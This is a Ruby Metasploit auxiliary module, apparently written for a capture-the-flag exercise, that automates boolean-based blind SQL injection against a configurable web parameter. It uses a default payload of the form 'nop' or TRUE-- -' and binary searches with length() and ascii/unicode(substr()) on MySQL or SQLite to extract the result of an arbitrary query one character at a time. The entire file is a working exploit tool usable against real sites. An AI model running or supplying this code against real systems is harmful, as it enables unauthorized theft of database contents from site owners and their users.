##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom module for SQLi (CTF)',
      'Description'    => %q{
        This is a custom module to exploit SQLi.
      },
      'Author'         => [ 'Sim', ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => ''))

    register_options(
      [
        OptString.new("METHOD", [ true, "HTTP method for {PARAM} (GET|POST)", "GET" ]),
        OptString.new("TARGETURI", [ true, "Vulnerable URI", "/" ]),
        OptString.new("PARAM", [ true, "Vulnerable parameter", "p" ]),
        OptBool.new("BOOL_PATTERN", [ true, "To get the pattern, the injection have to be (FALSE|TRUE)", 0 ]),
        OptString.new("PATTERN", [ true, "Pattern when the answer is {BOOL_PATTERN}", "No such user" ]),
        OptString.new("INJ_TO_GET_TRUE", [ true, "Injection to get a TRUE (TRUE will be used to inject the string we need)", "nop' or TRUE-- - " ]),
        OptString.new("INJECTION", [ true, "The output we are looking for", "version()" ]),
        OptString.new("OTHER_POST_DATA", [ false, "Other POST data, if needed", "" ]),
        OptString.new("DATABASE", [ true, "Targeted database (MySQL|Sqlite)", "MySQL" ]),
      ])
  end

  def send_request(data)
    method = data ['method']
    uri = data['uri']
    param = data['param']
    inj = data['inj_to_send']
    post_data = data['post_data']
      
    begin
      if ( method.downcase == "get" && post_data == "" )
        if uri.include?('?')
          req_uri = "#{uri}&#{param}=#{inj}"
        else
          req_uri = "#{uri}?#{param}=#{inj}"
        end
        vprint_status("GET #{rhost}/#{req_uri}")
        res = send_request_raw({
          'method' => 'GET',
          'uri' => req_uri,
          'version' => '1.0',
          'vhost' => vhost
        })
        return res
      end
      if ( method.downcase == "get")
        req_post_data= {}
        post_data.split('&').each do |x| 
          req_post_data["#{x.split('=')[0]}"] = "#{x.split('=')[1]}"
          for i in 2..x.split('=').size-1
            req_post_data["#{x.split('=')[0]}"] += "=#{x.split('=')[i]}"
          end
          vprint_status("req_post_data[\"#{x.split('=')[0]}\"] = \"#{x.split('=')[1]}\"")
        end 
        if uri.include?('?')
          req_uri = "#{uri}&#{param}=#{inj}"
        else
          req_uri = "#{uri}?#{param}=#{inj}"
        end
        vprint_status("POST --data '#{req_post_data.to_s}' #{rhost}/#{req_uri}")
        res = send_request_cgi({
          'method' => 'POST',
          'uri' => req_uri,
          'vars_post' => req_post_data,
          'version' => '1.0',
          'vhost' => vhost
        })
        return res
      end
      req_post_data = {}
      "#{post_data}&#{param}=#{inj}".split('&').each do |x|
        req_post_data["#{x.split('=')[0]}"] = "#{x.split('=')[1]}"
        for i in 2..x.split('=').size-1
            req_post_data["#{x.split('=')[0]}"] += "=#{x.split('=')[i]}"
        end
      end 
      vprint_status("POST --data '#{req_post_data.to_s}' #{rhost}/#{uri}")
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => uri,
        'vars_post' => req_post_data,
        'version' => '1.0',
        'vhost' => vhost
      })
      return res
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      print_error("Failed: #{e.class} - #{e.message}")
    end
  end

  def init_data
    data = {}
    data['method'] = datastore['METHOD'].downcase
    data['uri'] = datastore['TARGETURI']
    if data['method']=="get"
      data['param'] = Rex::Text.uri_encode(datastore['PARAM'])
      data['inj_to_get_true'] = Rex::Text.uri_encode(datastore['INJ_TO_GET_TRUE'])
    else
      data['param'] = datastore['PARAM']
      data['inj_to_get_true'] = datastore['INJ_TO_GET_TRUE']
    end
    data['bool_pattern'] = datastore['BOOL_PATTERN']
    data['pattern'] = datastore['PATTERN']
    data['post_data'] = datastore['OTHER_POST_DATA']
    data['inj_to_send'] = ""
    data['injection'] = datastore['INJECTION']
    data['database'] = datastore['DATABASE'].downcase
    return data
  end
  
  def check
    data = init_data
    vprint_line(data.to_s)
    
    data['inj_to_send'] = create_injection( data['inj_to_get_true'], "1=1" )
    print_status("Checking if #{data['method']} #{data['param']}=#{data['inj_to_send']} gives #{data['pattern']}. Should be #{data['bool_pattern'].to_s}.")
    
    res = send_request(data)
    
    if res && res.code == 200
      vprint_line(res.body)
      if (res.body.include?(data['pattern']) && data['bool_pattern']) || (!res.body.include?(data['pattern']) && !data['bool_pattern'])
        print_status("Injection to get true : ok")
      else
        print_error("Parameters may be wrong")
        return Exploit::CheckCode::Safe
      end
    end

    data['inj_to_send'] = create_injection( data['inj_to_get_true'], "1=2" )
    print_status("Checking if #{data['method']} #{data['param']}=#{data['inj_to_send']} gives #{data['pattern']}. Should be #{data['bool_pattern'].to_s}.")
    
    res = send_request(data)
    
    if res && res.code == 200
      vprint_line(res.body)
      if (res.body.include?(data['pattern']) && !data['bool_pattern']) || (!res.body.include?(data['pattern']) && data['bool_pattern'])
        print_status("Injection to get false : ok")
        return Exploit::CheckCode::Vulnerable
      else
        print_error("Parameters may be wrong")
        return Exploit::CheckCode::Safe
      end
    end

    Exploit::CheckCode::Unknown
  end

  def create_injection(inj_true, injection)
    if !inj_true.include?("TRUE")
      print_error("#{inj_true} doesn't contain 'TRUE'")
      return
    end
    return inj_true.gsub('TRUE',injection)
  end

  def run
    data=init_data
    print_status("Injection: #{data['injection']}")

    # Looking for the length of the string
    min = 0
    max = 200
    _next = ( min + max + 1 )/2
    while _next < max do  # next=max => smaller next for length(INJECTION)<next
      vprint_line("NEXT:#{_next.to_s}  MIN:#{min.to_s}  MAX:#{max.to_s}")
      data['inj_to_send'] = create_injection( data['inj_to_get_true'], "length((#{data['injection']}))<#{_next.to_s}")
      res = send_request(data)
      if res && res.code == 200
        if (res.body.include?(data['pattern']) && data['bool_pattern']) || (!res.body.include?(data['pattern']) && !data['bool_pattern']) # length(injection) < next
          max = _next
        else
          min = _next
        end
      else
        print_error("Error while connecting to RHOST")
        return 1
      end
      _next = ( min + max + 1 )/2
    end
    _length = min
    print_good("Length: #{_length.to_s}")

    # Looking for the string
    i = 1
    out = ""
    while i < _length+1 do
      min = 32
      max = 127
      _next = ( min + max + 1 )/2
      while _next < max do
        case data['database']
        when "mysql"
          vprint_status("Targeted database : #{data['database']}")
          data['inj_to_send'] = create_injection( data['inj_to_get_true'], "ascii(substr((#{data['injection']}),#{i.to_s},1))<#{_next.to_s}") # MYSQL
        when "sqlite"
          vprint_status("Targeted database : #{data['database']}")
          data['inj_to_send'] = create_injection( data['inj_to_get_true'], "unicode(substr((#{data['injection']}),#{i.to_s},1))<#{_next.to_s}") #SQLITE
        else
          print_error("Unknown database: #{data['database']}")
          return
        end
        res = send_request(data)
        if res && res.code == 200
          if (res.body.include?(data['pattern']) && data['bool_pattern']) || (!res.body.include?(data['pattern']) && !data['bool_pattern']) # length(injection) < n
            max = _next
          else
            min = _next
          end
        else 
          print_error("Error while connecting to RHOST")
          return 1
        end
        _next = ( min + max + 1 )/2
      end
      out = out + min.chr
      i = i + 1
    end
    print_good("Found: #{out}")
  end
end

